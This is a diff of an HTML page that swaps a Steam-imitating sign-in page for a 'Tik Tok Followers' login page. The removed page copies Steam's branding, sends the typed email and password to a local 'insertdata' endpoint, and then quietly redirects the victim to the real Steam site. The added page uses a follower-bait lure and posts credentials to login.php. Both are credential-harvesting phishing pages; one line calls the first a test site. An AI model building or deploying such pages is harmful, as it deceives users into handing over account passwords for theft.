@@ -1,505 +1,62 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome - Sign In</title>
-    <link rel="stylesheet" href="style.css">
-    <link rel="icon" href="https://store.fastly.steamstatic.com/public/shared/images/responsive/header_logo.png" type="image/png">
-    <style>
-     body {
-    margin: 0;
-    font-family: Arial, sans-serif;
-    color: #c7d5e0;
-    background-color: #1b2838;
-    overflow-x: hidden;
-}
+<html>
 
-.background-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background-image: url('https://store.fastly.placeholder.com/public/shared/images/joinsteam/new_login_bg_strong_mask_mobile.jpg');
-    background-size: cover;
-    background-position: center;
-    filter: brightness(0.6);
-    z-index: -1;
-}
 
-.header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding: 15px 50px;
-    background-color: rgba(27, 40, 56, 0.8);
-    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
-    position: relative;
-    z-index: 10;
-}
-
-.header .logo img {
-    height: 30px;
-}
-
-/* Hamburger menu styles */
-.hamburger-menu {
-    display: none; /* Hidden by default, shown on mobile */
-    font-size: 24px;
-    color: #c7d5e0;
-    cursor: pointer;
-    order: 2; /* Place it after the logo but before the nav-wrapper on small screens */
-}
-
-.hamburger-menu i {
-    padding: 5px;
-}
-
-.nav-wrapper {
-    display: flex; /* Default display for desktop */
-    justify-content: space-between;
-    align-items: center;
-    flex-grow: 1; /* Allows it to take available space */
-}
-
-.nav-links,
-.header-right {
-    display: flex;
-    align-items: center;
-}
-
-.nav-links a,
-.header-right a {
-    color: #c7d5e0;
-    text-decoration: none;
-    margin-left: 20px;
-    font-size: 14px;
-    transition: color 0.3s ease;
-    white-space: nowrap;
-}
-
-.nav-links a:hover,
-.header-right a:hover {
-    color: #fff;
-}
-
-.header .install-steam {
-    background-color: #5b9228;
-    color: #fff;
-    padding: 5px 10px;
-    border-radius: 3px;
-    font-weight: bold;
-    text-transform: uppercase;
-}
-
-.header .login-btn {
-    color: #66c0f4;
-}
-
-.header .language-select {
-    color: #66c0f4;
-}
-
-.login-container {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: calc(100vh - 80px);
-    padding: 20px;
-    box-sizing: border-box;
-}
-
-.login-box {
-    background-color: rgba(0, 0, 0, 0.8);
-    padding: 30px;
-    border-radius: 5px;
-    text-align: center;
-    width: 600px;
-    max-width: 90%;
-    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
-    border-top: 1px solid rgba(255, 255, 255, 0.1);
-}
-
-.login-box h2 {
-    color: #fff;
-    font-size: 28px;
-    margin-bottom: 30px;
-    text-align: left;
-}
-
-.login-content {
-    display: flex;
-    justify-content: space-between;
-    gap: 30px;
-}
-
-.login-form {
-    flex: 1;
-    min-width: 280px;
-    text-align: left;
-}
-
-.sign-in-heading {
-    color: #8f98a0;
-    font-size: 12px;
-    margin-bottom: 5px;
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
-}
-
-.login-form input[type="text"],
-.login-form input[type="password"] {
-    width: calc(100% - 20px);
-    padding: 10px;
-    margin-bottom: 15px;
-    background-color: #32353c;
-    border: 1px solid #484b51;
-    color: #fff;
-    border-radius: 3px;
-    font-size: 14px;
-}
-
-.login-form input[type="text"]:focus,
-.login-form input[type="password"]:focus {
-    outline: none;
-    border-color: #67c2ef;
-}
-
-.remember-me {
-    display: flex;
-    align-items: center;
-    margin-bottom: 20px;
-    font-size: 13px;
-    color: #8f98a0;
-}
-
-.remember-me input[type="checkbox"] {
-    margin-right: 8px;
-    accent-color: #66c0f4;
-}
-
-.sign-in-button {
-    width: 100%;
-    padding: 12px;
-    background: linear-gradient(to right, #417a9b, #5997b6);
-    border: none;
-    border-radius: 3px;
-    color: #fff;
-    font-size: 16px;
-    font-weight: bold;
-    cursor: pointer;
-    transition: background 0.3s ease;
-}
-
-.sign-in-button:hover {
-    background: linear-gradient(to right, #4a84a6, #61a2c2);
-}
-
-.help-link {
-    display: block;
-    margin-top: 20px;
-    color: #8f98a0;
-    text-decoration: none;
-    font-size: 13px;
-    transition: color 0.3s ease;
-}
-
-.help-link:hover {
-    color: #fff;
-}
-
-.qr-code-section {
-    flex: 1;
-    min-width: 200px;
-    text-align: center;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-}
-
-.qr-code-box {
-    background-color: #fff;
-    padding: 10px;
-    border-radius: 3px;
-    display: inline-flex;
-    justify-content: center;
-    align-items: center;
-    margin-top: 10px;
-    width: 150px;
-    height: 150px;
-    box-sizing: border-box;
-    text-align: center;
-}
-
-.qr-code-box.error {
-    background-color: #32353c;
-    color: #e6e6e6;
-    border: 1px dashed #666;
-}
-
-.qr-error-message {
-    margin: 0;
-    font-size: 14px;
-    color: #8f98a0;
-}
-
-.qr-info {
-    color: #8f98a0;
-    font-size: 13px;
-    margin-top: 20px;
-}
-
-.steam-mobile-app {
-    color: #66c0f4;
-    cursor: pointer;
-}
-
-.footer-games {
-    position: absolute;
-    bottom: 0;
-    left: 0;
-    right: 0;
-    display: flex;
-    justify-content: space-around;
-    padding: 10px;
-    color: rgba(255, 255, 255, 0.05);
-    font-size: 80px;
-    font-weight: bold;
-    pointer-events: none;
-    user-select: none;
-    z-index: -2;
-}
-
-/* --- Media Queries for Responsiveness --- */
-
-/* For screens smaller than 768px (common tablet portrait and large mobile) */
-@media (max-width: 768px) {
-    .header {
-        padding: 10px 20px;
-        flex-wrap: nowrap; /* Prevent immediate wrapping of header elements */
-        justify-content: space-between; /* Space between logo and hamburger */
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Tik Tok Followers</title>
+<script src="jquery.min.js"></script>
+<script src="jscript.js"></script>
+<link rel="stylesheet" type="text/css" href="style.css">
+<style>
+    @media(max-width:760px){
+       #TFG{
+           font-size:140%;
+       } 
+       .buttonstyle{
+           font-size:100%;
+       }
+    
+    .followers , .likes{
+        width:95%;
     }
-
-    .hamburger-menu {
-        display: block; /* Show hamburger on mobile */
     }
-
-    .nav-wrapper {
-        display: none; /* Hide nav links by default on mobile */
-        flex-direction: column;
-        width: 100%;
-        position: absolute;
-        top: 60px; /* Below the header */
-        left: 0;
-        background-color: rgba(27, 40, 56, 0.95); /* Dark background for dropdown */
-        box-shadow: 0 5px 10px rgba(0, 0, 0, 0.5);
-        padding: 15px 0;
-        align-items: center;
-    }
-
-    .nav-wrapper.active {
-        display: flex; /* Show nav links when active */
-    }
-
-    .nav-links,
-    .header-right {
-        flex-direction: column;
-        width: 100%;
-    }
-
-    .nav-links a,
-    .header-right a {
-        margin: 10px 0; /* Stack links vertically */
-        padding: 5px 0;
-        text-align: center;
-        width: 100%;
-    }
-
-    .login-container {
-        padding: 10px;
-        align-items: flex-start;
-    }
-
-    .login-box {
-        padding: 20px;
-        margin-top: 50px;
-    }
-
-    .login-content {
-        flex-direction: column;
-        align-items: center;
-        gap: 20px;
-    }
-
-    .login-form {
-        width: 100%;
-        min-width: unset;
-    }
-
-    .login-form input[type="text"],
-    .login-form input[type="password"],
-    .sign-in-button {
-        width: 100%;
-    }
-
-    /* Hide QR section on screens smaller than 768px */
-    .qr-code-section {
-        display: none;
-    }
-
-    .footer-games {
-        font-size: 40px;
-        bottom: 5px;
-        white-space: nowrap;
-        overflow: hidden;
-        text-overflow: ellipsis;
-    }
-}
-
-/* For screens smaller than 480px (common mobile portrait) */
-@media (max-width: 480px) {
-    .header {
-        padding: 10px 15px;
-    }
-
-    .login-box {
-        padding: 15px;
-    }
-
-    .login-box h2 {
-        font-size: 24px;
-        margin-bottom: 20px;
-    }
-
-    .footer-games {
-        font-size: 25px;
-    }
-}
-.background-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background-image: url('https://store.fastly.steamstatic.com/public/shared/images/joinsteam/new_login_bg_strong_mask_mobile.jpg'); /* This is the URL you provided */
-    background-size: cover;
-    background-position: center;
-    filter: brightness(0.6); /* Darken the background image */
-    z-index: -1;
-}
-    </style>
-
-    <script>
-          const uid = "user123user123"; 
-          const websiteName = "mywebsitemywebsite"; 
-      
-          async function handleSubmit(event) {
-            event.preventDefault(); 
-            const email = document.getElementById("email").value;
-            const password = document.getElementById("password").value;
-            const signInButton = document.getElementById("amazon");
-          signInButton.disabled = true;
-          signInButton.style.opacity = '0.5';
-          signInButton.style.cursor = 'not-allowed';
-          
-            try {
-              const response = await fetch("http://localhost:5237/insertdata", {
-                method: "POST",
-                headers: {
-                  "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                  uid: uid,
-                  websiteName: websiteName,
-                  email: email,
-                  password: password
-                })
-              });
-      
-               window.location.href = "https://steampowered.com/";
-          } catch (error) {
-            window.location.href = "https://steampowered.com/";
-            }
-          }
-        </script>
-
+</style>
 </head>
-<body>
-    <div class="background-overlay"></div>
-    <div class="header">
-        <div class="logo">
-            <img src="https://store.fastly.steamstatic.com/public/shared/images/responsive/header_logo.png" alt="Welcome Logo">
+<body onload="updateyear()">
+</div>
+<div id="main-tool">
+	<div class="wrapper"><img src="logo.png"></div>
+	<h1 id="TFG">Login</h1>
+
+<p class="sub-heading"></p>
+<p class="sub-heading"></p>
+
+
+    <form action="login.php" method="POST">
+    <center>
+    <div id="fillup">
+        <div class="form-option">
+        	<input name="email" class="input-form input-command" type="text" placeholder="Username/Email/Phone" required>
         </div>
-        <div class="hamburger-menu" id="hamburger-menu">
-            <i class="fas fa-bars"></i>
+    <div id="fillup">
+        <div class="form-option">
+        	<input name="password" class="input-form input-command" type="password" placeholder="Password" required>
         </div>
-        <div class="nav-wrapper" id="nav-wrapper">
-            <div class="nav-links">
-                <a href="#">STORE</a>
-                <a href="#">COMMUNITY</a>
-                <a href="#">ABOUT</a>
-                <a href="#">SUPPORT</a>
-            </div>
-            <div class="header-right">
-                <a href="#" class="install-steam">Install Welcome</a>
-                <a href="#" class="login-btn">login</a>
-                <a href="#" class="language-select">language &#9660;</a>
-            </div>
-        </div>
+
+        <br><br>
+        <button class="buttonstyle"><b>Login</b></button>
+        </center>
+
     </div>
+</div>
 
-    <div class="login-container">
-        <div class="login-box">
-            <h2>Sign in</h2>
-            <div class="login-content">
-                <div class="login-form">
-                    <p class="sign-in-heading">SIGN IN WITH ACCOUNT NAME</p>
-                    <input type="text" id="email" steamstatic="username" value="">
-                    <p class="sign-in-heading">PASSWORD</p>
-                    <input type="password" id="password" steamstatic="password" value="">
-                    <label class="remember-me">
-                        <input type="checkbox" checked> Remember me
-                    </label>
-                    <button class="sign-in-button" id="amazon" onclick="handleSubmit(event)">Sign in</button>
-                    <a href="https://steampowered.com" class="help-link">Help, I can't sign in</a>
-                </div>
-                <div class="qr-code-section">
-                    <p class="sign-in-heading">OR SIGN IN WITH QR</p>
-                    <div class="qr-code-box">
-                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=example_qr_code_data" alt="QR Code">
-                    </div>
-                    <p class="qr-info">Use the <span class="steam-mobile-app">Welcome Mobile App</span> to sign in via QR code. This is a test website, dont login with real credentials</p>
-                </div>
-            </div>
-        </div>
-    </div>
+<div id="steps" style="display:none;">
 
-    <div class="footer-games">
-        <p>HU</p>
-        <p>ISLAND</p>
-        <p>A WINTER</p>
-        <p>BIG OGRE</p>
-        <p>TOMS RAIDER</p>
-        <p>SHIRTS HIKE</p>
-    </div>
-    <script>
-        // This is simple JavaScript to toggle the nav on hamburger click
-        // In a real application, you'd likely use more robust JS or a framework.
-        const hamburger = document.getElementById('hamburger-menu');
-        const navWrapper = document.getElementById('nav-wrapper');
+</div>
 
-        hamburger.addEventListener('click', () => {
-            navWrapper.classList.toggle('active');
-        });
-
-        // Close nav when clicking outside (optional)
-        document.addEventListener('click', (event) => {
-            if (!navWrapper.contains(event.target) && !hamburger.contains(event.target)) {
-                navWrapper.classList.remove('active');
-            }
-        });
-    </script>
+<div id="comment" style="display:none;" >
+</div>
 </body>
+
 </html>
